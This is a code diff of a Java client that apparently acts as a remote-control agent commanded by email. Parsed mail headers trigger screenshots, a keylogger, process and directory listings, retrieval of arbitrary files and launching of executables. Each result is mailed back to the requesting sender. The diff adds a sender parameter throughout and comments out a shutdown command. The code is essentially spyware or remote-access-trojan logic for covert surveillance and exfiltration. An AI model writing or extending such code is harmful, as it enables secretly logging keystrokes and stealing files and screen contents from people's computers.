@@ -30,10 +30,12 @@ public class MainClient {
                \\ \\__\\    \\ \\_______\\    \\ \\________\\ \\__\\ \\__\\ \\__/ /     \\ \\__\\ \\__\\
                 \\|__|     \\|_______|     \\|________|\\|__|\\|__|\\|__|/       \\|__|\\|__|
             """;
-    private static boolean takeShot(int id) {
+
+    private static boolean takeShot(int id, String sender) {
         String subject = "res/" + id;
         try {
-            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot(), true);
+            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot()
+                    , true, sender);
             return true;
         } catch (IOException | MessagingException e) {
             e.printStackTrace();
@@ -42,13 +44,13 @@ public class MainClient {
     }
 
 
-    private static boolean keyLog(int id, long time) {
+    private static boolean keyLog(int id, long time, String sender) {
         String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
                 .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
         try {
             KeyLogger.getInstance().startLog(filename, time);
             String subject = "res / " + id;
-            SendMail.getInstance().sendMail(subject, null, filename, true);
+            SendMail.getInstance().sendMail(subject, null, filename, true, sender);
             return true;
         } catch (IOException e) {
             System.out.println("Error log");
@@ -61,25 +63,27 @@ public class MainClient {
         }
     }
 
-    private static boolean Shutdown(int id, String sudopass){
-        try{
+    private static boolean Shutdown(int id, String sudopass, String sender) {
+        try {
 
             int exitcode = ShutandLog.getInstance().Logout(sudopass);
-            if (exitcode!=0){
+            if (exitcode != 0) {
                 String subject = "res / " + id;
                 try {
-                    SendMail.getInstance().sendMail(subject, "Can't Shutdown, Exit code: "+exitcode, null, true);
-                }catch (IOException | MessagingException er){
+                    SendMail.getInstance().sendMail(subject, "Can't Shutdown, Exit code: " + exitcode
+                            , null, true, sender);
+                } catch (IOException | MessagingException er) {
                     er.printStackTrace();
                 }
                 return false;
             }
             return true;
-        }catch (Exception e){
+        } catch (Exception e) {
             String subject = "res / " + id;
             try {
-                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to error: " + e.toString(), null, true);
-            }catch (IOException | MessagingException er){
+                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to error: " + e.toString()
+                        , null, true, sender);
+            } catch (IOException | MessagingException er) {
                 er.printStackTrace();
             }
             e.printStackTrace();
@@ -87,24 +91,25 @@ public class MainClient {
         }
     }
 
-    private static boolean ListProcess(int id){
-        String subject = "res/"+id;
-        try{
-            SendMail.getInstance().sendMail(subject,null, ProcessPC.getInstance().ProcessList(), true);
+    private static boolean ListProcess(int id, String sender) {
+        String subject = "res/" + id;
+        try {
+            SendMail.getInstance().sendMail(subject, null, ProcessPC.getInstance().ProcessList(), true
+                    , sender);
             return true;
-        }catch(IOException | MessagingException e){
+        } catch (IOException | MessagingException e) {
             e.printStackTrace();
             return false;
         }
     }
 
-    private static boolean listDir(int id) {
+    private static boolean listDir(int id, String sender) {
         try {
             ListDir list = new ListDir("");
             String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
                     .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
             list.listAll(filename);
-            SendMail.getInstance().sendMail("res/" + id,null, filename, true);
+            SendMail.getInstance().sendMail("res/" + id, null, filename, true, sender);
             return true;
         } catch (IOException | MessagingException e) {
             System.out.println("error when list");
@@ -113,7 +118,7 @@ public class MainClient {
         }
     }
 
-    public static boolean getFile(int id, String header) {
+    public static boolean getFile(int id, String header, String sender) {
         try {
             Pattern pattern = Pattern.compile("\"(.*)\"");
             Matcher matcher = pattern.matcher(header);
@@ -125,15 +130,14 @@ public class MainClient {
             Path file = Path.of(filename);
             if (Files.exists(file)) {
                 if (Files.isRegularFile(file))
-                    SendMail.getInstance().sendMail("res/" + id, null, filename, false);
+                    SendMail.getInstance().sendMail("res/" + id, null, filename, false, sender);
                 else {
                     SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
-                            , "directory request", null, false);
+                            , "directory request", null, false, sender);
                 }
-            }
-            else{
+            } else {
                 SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
-                        , "File dont exist", null, false);
+                        , "File dont exist", null, false, sender);
             }
             return true;
         } catch (IOException | MessagingException e) {
@@ -143,68 +147,62 @@ public class MainClient {
         }
     }
 
-    public static boolean runexefile(int id, String path)  {
-        String subject = "res/"+id;
-        try{
+    public static boolean runexefile(int id, String path, String sender) {
+        String subject = "res/" + id;
+        try {
             Path file = Path.of(path);
-            if (Files.exists(file)){
-                if (Files.isRegularFile(file)){
-                    SendMail.getInstance().sendMail(subject,Boolean.toString(ProcessPC.getInstance().StartProcess(path)),null, true);
-                }
-                else if (path.endsWith(".app")){
-                    SendMail.getInstance().sendMail(subject,Boolean.toString(ProcessPC.getInstance().StartProcess(path)),null, true);
-                }
-                else {
+            if (Files.exists(file)) {
+                if (Files.isRegularFile(file)) {
+                    SendMail.getInstance().sendMail(subject, Boolean.toString(ProcessPC.getInstance().StartProcess(path))
+                            , null, true, sender);
+                } else if (path.endsWith(".app")) {
+                    SendMail.getInstance().sendMail(subject, Boolean.toString(ProcessPC.getInstance().StartProcess(path))
+                            , null, true, sender);
+                } else {
                     SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
-                            , "directory request", null, true);
+                            , "directory request", null, true, sender);
                 }
-            }else{
+            } else {
                 SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
-                        , "File dont exist", null, true);
+                        , "File dont exist", null, true, sender);
             }
             return true;
-        }
-        catch (IOException | MessagingException e){
+        } catch (IOException | MessagingException e) {
             System.out.println("can not run file");
             e.printStackTrace();
             return false;
         }
     }
 
-    public static boolean processRequest(String header) throws ArrayIndexOutOfBoundsException{
+    public static boolean processRequest(String header, String sender) throws ArrayIndexOutOfBoundsException {
         String[] parts = header.split("/");
         System.out.println(Arrays.toString(parts));
         int id = Integer.parseInt(parts[1].trim());
         String command = parts[2].trim();
         if (command.equalsIgnoreCase("takeshot")) {
-            return takeShot(id);
+            return takeShot(id, sender);
+        } else if (command.equalsIgnoreCase("keylog")) {
+            return keyLog(id, Long.parseLong(parts[3].trim()), sender);
         }
-        else if (command.equalsIgnoreCase("keylog")) {
-            return keyLog(id, Long.parseLong(parts[3].trim()));
-        }
-
-        else if (command.equalsIgnoreCase("Shutdown")){
-            if (parts.length > 3)
-                return Shutdown(id,parts[3].trim());
-            return Shutdown(id,"");
-        } else if (command.equalsIgnoreCase("ListProcess")) {
-            return ListProcess(id);
-        }
-        else if (command.equalsIgnoreCase("listdir")) {
-            return listDir(id);
+//        else if (command.equalsIgnoreCase("Shutdown")) {
+//            if (parts.length > 3)
+//                return Shutdown(id, parts[3].trim(), sender);
+//            return Shutdown(id, "", sender);}
+         else if (command.equalsIgnoreCase("ListProcess")) {
+            return ListProcess(id, sender);
+        } else if (command.equalsIgnoreCase("listdir")) {
+            return listDir(id, sender);
         } else if (command.equalsIgnoreCase("get")) {
-            return getFile(id,header);
-        } else if (command.equalsIgnoreCase("runexe")){
-            String filepath = header.substring( 19+ 1).trim();
-            return runexefile(id,filepath);
+            return getFile(id, header, sender);
+        } else if (command.equalsIgnoreCase("runexe")) {
+            String filepath = header.substring(19 + 1).trim();
+            return runexefile(id, filepath, sender);
         }
         return false;
     }
 
 
     public static void main(String[] args) {
-        System.out.println(BANNER);
-        System.out.println("Listeningg for request...");
-        CheckMail.getInstance().listen();
+
     }
 }
